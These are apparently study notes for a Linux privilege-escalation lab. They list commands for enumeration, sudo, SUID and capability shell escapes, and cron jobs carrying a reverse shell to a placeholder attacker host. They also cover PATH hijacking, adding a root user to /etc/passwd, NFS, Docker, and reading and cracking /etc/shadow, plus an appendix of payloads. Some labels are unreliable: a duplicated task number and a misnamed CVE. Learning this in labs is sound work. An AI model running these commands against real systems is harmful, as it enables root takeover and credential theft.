# Linux Privilege Escalation

__________________________________________________________________________________________


## TASK 3: Enumeration

### Host Information:
    hostname                  # return the hostname of the target machine but can easily be changed
    uname -a                  # print system information giving us additional detail about the kernel used by the system, 
                                useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.
    cat /proc/version         # Show kernel version and compiler info
    cat /etc/issue            # contains some information about the operating system but can easily be changed
    cat /etc/os-release       # Detailed OS information

### Process Information:
    ps -A                     # View all running processes
    ps axjf                   # View process tree
    ps aux                    # Show processes for all users with details
    top                       # Interactive process viewer

### System Environment:
    env                       # The env command will show environmental variables. 
                                The PATH variable may have a compiler or a scripting language (e.g. Python) 
                                that could be used to run code on the target system or leveraged for privilege escalation.
    echo $PATH                # Display PATH variable
    sudo -l                   # List commands user can run with sudo
    id                        # Show user and group information

### User Information:
    cat /etc/passwd           # List all users
    cat /etc/shadow           # User password hashes (root access needed)
    whoami                    # Current username
    last                      # Show last logged in users

### Network Information:
    ifconfig                  # Network interface information
    ip route                  # Display network routes
    netstat -a                # All listening ports and connections
    netstat -at               # All TCP ports
    netstat -l                # Listening ports only

### File System:
    find /home -name flag1.txt 2>/dev/null    # Find the file named "flag1.txt" in home directory
    grep -r "flag" /home /var/www 2>/dev/null # Search for text in files
    history                    # Command history

__________________________________________________________________________________________


## TASK 5: Kernel Exploits

### Kernel Vulnerability Assessment:
    uname -a                  # Check kernel version
    cat /proc/version         # Detailed kernel information

### Exploitation Process:
    1. Identify kernel version and architecture
    2. Search for exploits on Exploit-DB, GitHub, or other databases
    3. Download/compile exploit on attacker machine
    4. Transfer to target system
    5. Compile and execute exploit

### Example Commands:
    # Search for kernel exploits
    searchsploit "Linux Kernel 3.13"
    
    # Compile and run exploit
    gcc exploit.c -o exploit
    chmod +x exploit
    ./exploit

### Common Kernel Exploits:
    DirtyCow (CVE-2016-5195)
    overlayfs (CVE-2015-1328)
    uselib (CVE-2021-4034)

__________________________________________________________________________________________


## TASK 6: Sudo

Check target's permitted command through "sudo -l", find exploitation on GTFOBins, found one start exploit

### Sudo Permission Check:
    sudo -l                   # List all sudo permissions

### Common Sudo Exploits:
    # If user can run any command as root
    sudo su
    sudo -i

    # If specific binaries are allowed
    sudo /bin/bash
    sudo /bin/sh

### GTFOBins Method:
    Visit https://gtfobins.github.io/ for specific binary exploitation
    Example for nano:
        sudo nano
        ^R^X
        reset; sh 1>&0 2>&0

### Common Sudo Vulnerabilities:
    # Python
    sudo python -c 'import os; os.system("/bin/bash")'
    
    # Find
    sudo find / -exec /bin/bash \;
    
    # More
    sudo more /etc/hosts
    !/bin/bash

__________________________________________________________________________________________


## TASK 7: SUID

1.  find / -type f -perm -04000 -ls 2>/dev/null : list files that have SUID or SGID bits set.
2.  With the result, we found that base64 cat read files according to GTFOBins
3.  base64 FILE_PATH | base64 --decode

### Finding SUID/SGID Files:
    find / -type f -perm -04000 -ls 2>/dev/null    # SUID files
    find / -type f -perm -02000 -ls 2>/dev/null    # SGID files
    find / -perm -u=s -type f 2>/dev/null          # Alternative SUID search

### Common Exploitable SUID Binaries:
    # Base64 - Read files
    base64 "/etc/shadow" | base64 --decode
    
    # Find - Execute commands
    find . -exec /bin/bash -p \;
    
    # Nano/Vim - File editing
    nano /etc/passwd
    
    # Bash - Spawn shell
    bash -p

### GTFOBins SUID Exploitation:
    Check https://gtfobins.github.io/ for SUID exploitation techniques
    Example for base64:
        LFILE=/etc/shadow
        base64 "$LFILE" | base64 --decode

__________________________________________________________________________________________


## TASK 8: Capabilities

### Finding Capabilities:
    getcap -r / 2>/dev/null    # Recursive capability search

### Common Capability Exploits:
    # If python has cap_setuid
    /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
    
    # Perl with capabilities
    perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

### Exploitable Capabilities:
    cap_setuid+ep             # Can set UID
    cap_dac_read_search+ep    # Can bypass file read permissions
    cap_dac_override+ep       # Can bypass file write permissions

__________________________________________________________________________________________


## TASK 9: Cronjob

1. cat /etc/crontab : Look for Cronjob
2. bash -i >& /dev/tcp/<attacker ip>/1234 0>&1 : add this line to send bash to listener in one of the Cronjob
3. nc -lvnp PORT to listen for incoming bash

### Finding Cron Jobs:
    cat /etc/crontab          # System cron jobs
    crontab -l                # User cron jobs
    ls -la /etc/cron.*        # Cron directories
    cat /etc/cron.d/*         # Cron.d files

### Cron Job Exploitation:
    # If writable cron script
    echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> /path/to/cron/script
    
    # Start listener on attacker
    nc -lvnp PORT

### Common Cron Vulnerabilities:
    Writable cron scripts
    Wildcard in cron commands
    PATH manipulation in cron

### Wildcard Cron Exploitation:
    # If cron uses wildcards like *
    echo '#!/bin/bash' > /tmp/exploit.sh
    echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> /tmp/exploit.sh
    chmod +x /tmp/exploit.sh

__________________________________________________________________________________________


## TASK 10: PATH

1. find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u : helps us visualize what we have write permissions to.
2. export PATH=/home/murdoch:$PATH :  add one writable directory the current PATH variable
3. n /home/murdoch, run ls -l to see permission, only test program has execution rights.
4. We run test, it returns an error saying that thm is not found, indicating that the script is attempting to run a file/command called thm.
5. We can exploit this by creating our own thm :

        #include <unistd.h>
        
        int main() {
            setgid(0);
            setuid(0);
            system("thm");
        }

6. Run chmod 777 thm to give full permission to all user. By running ./test again, we have root access.

### PATH Environment Manipulation:
    echo $PATH                # Check current PATH
    export PATH=/tmp:$PATH    # Prepend writable directory

### PATH Hijacking Example:
    # Find writable directories
    find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
    
    # Create malicious binary
    echo -e '#include <unistd.h>\nint main() {\nsetgid(0);\nsetuid(0);\nsystem("/bin/bash");\n}' > /tmp/thm.c
    gcc /tmp/thm.c -o /tmp/thm
    chmod 777 /tmp/thm
    export PATH=/tmp:$PATH

__________________________________________________________________________________________


## TASK 10: Writable Passwd File (Authored by AI)

### Passwd File Exploitation:
    # Check if /etc/passwd is writable
    ls -l /etc/passwd
    
    # Add new root user
    echo "root2:$(openssl passwd -1 -salt xyz password123):0:0:root:/root:/bin/bash" >> /etc/passwd
    
    # Switch to new user
    su root2
    password: password123

__________________________________________________________________________________________


## TASK 11: NFS Privilege Escalation (Authored by AI)

### NFS Configuration Check:
    cat /etc/exports          # NFS export configurations

### NFS Exploitation:
    # On attacker machine
    showmount -e TARGET_IP
    
    # Mount NFS share
    mkdir /tmp/nfs
    mount -o rw,vers=2 TARGET_IP:/share /tmp/nfs
    
    # Create SUID binary
    cd /tmp/nfs
    gcc -o shell shell.c
    chmod +s shell

__________________________________________________________________________________________


## TASK 12: Capstone Challenge

Find binary with suid, look for match at GTFOBins
find / -type f -perm -04000 -ls 2>/dev/null

### Flag1
    base64 "/etc/shadow" | base64 --decode
    john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
    login as missy then read flag1.txt


### Flag2
    base64 "/home/rootflag/flag2.txt" | base64 --decode

__________________________________________________________________________________________


## TASK 13: Additional Exploitation Techniques (Authored by AI)

### Password Cracking:
    # Extract hashes from /etc/shadow
    unshadow passwd shadow > hashes.txt
    
    # Crack with John
    john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

### SSH Key Abuse:
    # Look for SSH keys
    find / -name id_rsa 2>/dev/null
    find / -name *.pem 2>/dev/null
    
    # Use found keys
    chmod 600 key.pem
    ssh -i key.pem user@target

### Docker Privilege Escalation:
    # Check if in docker container
    cat /proc/1/cgroup | grep docker
    
    # If user in docker group
    docker run -v /:/mnt --rm -it alpine chroot /mnt sh

__________________________________________________________________________________________


## TASK 14: Tools of Trade (Authored by AI)

### Automated Enumeration Tools:

#### LinPEAS:
    # Download and run
    wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh > linpeas_output.txt

#### LinEnum:
    # Common Linux enumeration script
    ./LinEnum.sh -t > linenum_report.txt

#### Linux Exploit Suggester:
    # Check for potential exploits
    ./les.sh -k `uname -r`

#### Unix Privesc Check:
    # Comprehensive privilege escalation checker
    python unix-privesc-check standard

#### Metasploit:
    # If you have meterpreter session
    use post/multi/recon/local_exploit_suggester
    set session 1
    run

__________________________________________________________________________________________


## Appendix (Authored by AI):

### Critical Files:
    /etc/passwd              # User account information
    /etc/shadow              # User password hashes
    /etc/sudoers             # Sudo configuration
    /etc/crontab             # System cron jobs
    /etc/exports             # NFS exports

### Important Directories:
    /home/*                  # User home directories
    /tmp                     # Temporary files (often writable)
    /var/log                 # Log files
    /var/www                 # Web root directories

### Useful Commands:
    find / -perm -4000 2>/dev/null          # Find SUID files
    find / -writable -type d 2>/dev/null    # Find writable directories
    crontab -l                              # List user cron jobs
    getcap -r / 2>/dev/null                 # Find capabilities

### Common Payloads:
    # Reverse shell
    bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
    
    # SUID shell
    int main() { setgid(0); setuid(0); system("/bin/bash"); }